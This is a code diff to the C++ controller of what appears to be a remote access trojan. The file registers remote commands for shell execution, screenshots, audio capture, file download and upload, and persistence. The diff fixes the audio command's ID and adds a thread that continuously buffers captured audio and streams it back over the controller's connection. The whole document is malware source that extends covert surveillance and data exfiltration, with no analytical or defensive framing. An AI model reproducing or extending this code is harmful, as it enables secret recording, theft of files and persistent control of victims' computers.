@@ -3,6 +3,7 @@
 #include <iostream>
 #include <string>
 #include <vector>
+#include <thread>
 #include "packet.h"
 #include "simplepacket.h"
 #include "simplecommand.h"
@@ -14,7 +15,7 @@ void register_all_commands() {
 	register_command(4, discordCommand);
 	register_command(5, exec);
 	register_command(6, screenshot);
-	register_command(6, audioCommand);
+	register_command(7, audioCommand);
 	register_command(8, downloadFile);
 	register_command(9, uploadFile);
 	register_command(10, persist);
@@ -25,7 +26,20 @@ void Controller::init() {
 	register_all_commands();
 }
 
+void Controller::flush_audio_buffer() {
+	while (true) {
+		if (audio_buf.size() > 4096) {
+			SimplePacket<vector<char>> pkt(4, audio_buf);
+			conn->write_packet_sync(pkt.serialize());
+			audio_buf.clear();
+		}
+		this_thread::sleep_for(chrono::milliseconds(10));
+	}
+}
+
+
 void Controller::loop() {
+	thread audio_flush_thread(&Controller::flush_audio_buffer, this);
 	while (true) {
 		SerializedPacket spkt = conn->read_packet();
 		Packet::handle_packet(*this, *Packet::parse(spkt).get());
@@ -55,4 +69,8 @@ void Controller::err_println(string err) {
 void Controller::send_buffer(const vector<char> buf) {
 	SimplePacket<vector<char>> pkt(3, buf);
 	conn->write_packet_sync(pkt.serialize());
+}
+
+void Controller::buffer_audio(const char* buf, size_t size) {
+	audio_buf.insert(audio_buf.end(), buf, buf + size);
 }
